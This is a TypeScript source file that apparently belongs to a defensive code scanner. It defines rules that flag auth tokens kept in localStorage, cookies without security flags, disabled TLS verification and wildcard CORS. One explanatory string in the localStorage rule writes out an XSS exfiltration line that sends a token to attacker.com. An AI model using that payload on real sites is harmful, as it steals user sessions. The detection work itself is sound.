import type { SecurityRule, SecurityFindingDetails } from "../types.js";

export const storageNetworkingRules: SecurityRule[] = [
  // 1. JWT / Auth Tokens Stored in localStorage
  {
    id: "SEC-STO-001",
    category: "storage",
    severity: "warning",
    title: "Authentication Token Stored in localStorage",
    frameworks: ["react", "nextjs", "all"],
    provider: "none",
    description: "JWT or auth session token stored in browser localStorage or sessionStorage.",
    whyThisIsDangerous:
      "localStorage is accessible to any JavaScript running on the origin domain. Any Cross-Site Scripting (XSS) flaw allows scripts to immediately exfiltrate tokens.",
    howAttackersAbuseIt:
      "An XSS vulnerability executes `fetch('http://attacker.com?t=' + localStorage.getItem('token'))` to steal user sessions permanently.",
    suggestedFix: "Store authentication tokens in HttpOnly, Secure, SameSite cookies which browser JavaScript cannot read.",
    owaspMapping: "A01:2021 - Broken Access Control",
    cwe: "CWE-922",
    testCases: [
      {
        name: "Detect localStorage auth token",
        code: `localStorage.setItem('auth_token', token);`,
        shouldMatch: true,
      },
    ],
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        const lower = lineText.toLowerCase();

        if (
          lower.includes("localstorage.setitem") &&
          (lower.includes("token") || lower.includes("auth") || lower.includes("jwt") || lower.includes("session"))
        ) {
          findings.push({
            ruleId: "SEC-STO-001",
            category: "storage" as const,
            severity: "warning" as const,
            confidence: "high" as const,
            title: "Authentication Token Stored in localStorage",
            message: `Auth token stored in localStorage at line ${lineNum}: '${lineText.trim()}'.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "localStorage is vulnerable to session theft via XSS.",
            howAttackersAbuseIt: "Attacker executes XSS payload to read localStorage tokens.",
            suggestedFix: "Use HttpOnly, Secure cookies for storing auth tokens.",
            automaticFixAvailability: { available: false },
            documentation: {
              owasp: "A01:2021-Broken Access Control",
              cwe: "CWE-922",
            },
            owaspMapping: "A01:2021 - Broken Access Control",
          });
        }
      });

      return findings;
    },
  },

  // 2. Sensitive Cookies Missing Security Flags (HttpOnly / Secure / SameSite)
  {
    id: "SEC-STO-002",
    category: "storage",
    severity: "warning",
    title: "Insecure Cookie Configuration",
    frameworks: ["express", "nextjs", "all"],
    provider: "none",
    description: "Cookie set without HttpOnly, Secure, or SameSite attributes.",
    whyThisIsDangerous:
      "Cookies missing HttpOnly can be stolen via XSS. Cookies missing Secure can be intercepted over unencrypted HTTP. Cookies missing SameSite are vulnerable to CSRF.",
    howAttackersAbuseIt:
      "Attacker uses XSS to steal document.cookie or uses CSRF attacks against user sessions.",
    suggestedFix: "Set `{ httpOnly: true, secure: true, sameSite: 'lax' }` when configuring cookies.",
    owaspMapping: "A05:2021 - Security Misconfiguration",
    cwe: "CWE-614",
    testCases: [
      {
        name: "Detect res.cookie without httpOnly",
        code: `res.cookie('session', token);`,
        shouldMatch: true,
      },
    ],
    safeAutoFix: (content) => {
      if (content.includes("res.cookie(") && !content.includes("httpOnly")) {
        const fixed = content.replace(
          /res\.cookie\(([^,]+),\s*([^,)]+)\)/g,
          "res.cookie($1, $2, { httpOnly: true, secure: process.env.NODE_ENV === 'production', sameSite: 'lax' })"
        );
        return {
          modifiedContent: fixed,
          description: "Added httpOnly, secure, and sameSite security options to res.cookie().",
        };
      }
      return null;
    },
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        const lower = lineText.toLowerCase();

        if (lower.includes("res.cookie(") && !lower.includes("httponly")) {
          findings.push({
            ruleId: "SEC-STO-002",
            category: "storage" as const,
            severity: "warning" as const,
            confidence: "high" as const,
            title: "Insecure Cookie Configuration",
            message: `res.cookie() at line ${lineNum} missing httpOnly flag.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "Cookies without httpOnly flag can be read by XSS scripts.",
            howAttackersAbuseIt: "Attacker steals cookie values via document.cookie.",
            suggestedFix: "Pass { httpOnly: true, secure: true, sameSite: 'lax' } in res.cookie options.",
            automaticFixAvailability: {
              available: true,
              fixId: "fix-cookie-flags",
              description: "Add httpOnly, secure, and sameSite options.",
            },
            documentation: {
              owasp: "A05:2021-Security Misconfiguration",
              cwe: "CWE-614",
            },
            owaspMapping: "A05:2021 - Security Misconfiguration",
          });
        }
      });

      return findings;
    },
  },

  // 3. Disabled TLS Verification (`rejectUnauthorized: false`)
  {
    id: "SEC-NET-001",
    category: "networking",
    severity: "critical",
    title: "Disabled TLS Certificate Verification",
    frameworks: ["all"],
    provider: "none",
    description: "TLS SSL verification explicitly disabled with rejectUnauthorized: false.",
    whyThisIsDangerous:
      "Disabling TLS certificate verification renders HTTPS connections completely vulnerable to Man-in-the-Middle (MITM) attacks.",
    howAttackersAbuseIt:
      "Attacker on same network intercepts traffic, presents self-signed certificate, and reads plaintext API payloads.",
    suggestedFix: "Remove `rejectUnauthorized: false` and install proper trusted CA root certificates.",
    owaspMapping: "A02:2021 - Cryptographic Failures",
    cwe: "CWE-295",
    testCases: [
      {
        name: "Detect rejectUnauthorized false",
        code: `const agent = new https.Agent({ rejectUnauthorized: false });`,
        shouldMatch: true,
      },
    ],
    safeAutoFix: (content) => {
      if (content.includes("rejectUnauthorized: false")) {
        const fixed = content.replace(/rejectUnauthorized:\s*false/g, "rejectUnauthorized: true");
        return {
          modifiedContent: fixed,
          description: "Replaced rejectUnauthorized: false with rejectUnauthorized: true.",
        };
      }
      return null;
    },
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        if (lineText.includes("rejectUnauthorized: false") || lineText.includes("NODE_TLS_REJECT_UNAUTHORIZED = '0'") || lineText.includes('NODE_TLS_REJECT_UNAUTHORIZED = "0"')) {
          findings.push({
            ruleId: "SEC-NET-001",
            category: "networking" as const,
            severity: "critical" as const,
            confidence: "high" as const,
            title: "Disabled TLS Certificate Verification",
            message: `TLS verification disabled at line ${lineNum}: '${lineText.trim()}'.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "Disabling TLS verification enables Man-In-The-Middle attacks.",
            howAttackersAbuseIt: "Attacker intercepts network connection and reads sensitive payloads.",
            suggestedFix: "Enable TLS certificate validation.",
            automaticFixAvailability: {
              available: true,
              fixId: "fix-tls-verify",
              description: "Enable rejectUnauthorized: true.",
            },
            documentation: {
              owasp: "A02:2021-Cryptographic Failures",
              cwe: "CWE-295",
            },
            owaspMapping: "A02:2021 - Cryptographic Failures",
          });
        }
      });

      return findings;
    },
  },

  // 4. Insecure CORS Configuration (Wildcard Origin with Credentials)
  {
    id: "SEC-NET-002",
    category: "networking",
    severity: "warning",
    title: "Insecure CORS Wildcard Configuration",
    frameworks: ["express", "all"],
    provider: "none",
    description: "CORS configured with origin: '*' or dynamic reflection with credentials enabled.",
    whyThisIsDangerous:
      "Allowing wildcard CORS origins allows malicious websites to send authenticated cross-origin requests from victims' browsers.",
    howAttackersAbuseIt:
      "Attacker hosts evil.com which fires background fetch requests to victim's API, reading sensitive responses.",
    suggestedFix: "Specify trusted origin URLs explicitly in CORS middleware.",
    owaspMapping: "A05:2021 - Security Misconfiguration",
    cwe: "CWE-942",
    testCases: [
      {
        name: "Detect wildcard cors",
        code: `app.use(cors({ origin: '*', credentials: true }));`,
        shouldMatch: true,
      },
    ],
    match: (astContext) => {
      const findings: SecurityFindingDetails[] = [];
      const lines = astContext.fileContent.split("\n");

      lines.forEach((lineText, idx) => {
        const lineNum = idx + 1;
        const lower = lineText.toLowerCase();

        if (
          lower.includes("cors(") &&
          (lower.includes("origin: '*'") || lower.includes('origin: "*"') || lower.includes("origin: true"))
        ) {
          findings.push({
            ruleId: "SEC-NET-002",
            category: "networking" as const,
            severity: "warning" as const,
            confidence: "high" as const,
            title: "Insecure CORS Wildcard Configuration",
            message: `CORS configured with wildcard origin at line ${lineNum}.`,
            evidence: {
              file: astContext.filePath,
              line: lineNum,
              snippet: lineText.trim(),
            },
            affectedFiles: [astContext.filePath],
            affectedLines: [lineNum],
            whyThisIsDangerous: "Wildcard CORS origin permits unauthorized cross-origin requests.",
            howAttackersAbuseIt: "Attacker site makes cross-origin requests to access user data.",
            suggestedFix: "Restrict CORS origins to trusted domain allowlist.",
            automaticFixAvailability: { available: false },
            documentation: {
              owasp: "A05:2021-Security Misconfiguration",
              cwe: "CWE-942",
            },
            owaspMapping: "A05:2021 - Security Misconfiguration",
          });
        }
      });

      return findings;
    },
  },
];
